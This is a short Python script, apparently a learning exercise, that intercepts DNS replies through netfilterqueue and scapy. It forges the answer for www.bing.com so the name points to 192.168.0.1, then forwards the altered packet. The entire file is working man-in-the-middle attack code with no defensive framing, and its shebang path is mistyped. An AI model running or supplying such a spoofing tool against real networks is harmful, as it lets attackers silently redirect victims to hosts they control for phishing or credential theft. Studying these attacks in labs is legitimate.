#! user/bin/env python

import netfilterqueue
import scapy.all as scapy


# callback function to execute on each packet stored in this que
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing Target" + str(qname))
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.0.1")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

        print(scapy_packet.show())
    # print(scapy_packet)

    # now forward this modified packet
    packet.accept()


# object of netfilterqueue class
queue = netfilterqueue.NetfilterQueue()
# bind the object to the que created in iptables
queue.bind(0, process_packet)
queue.run()
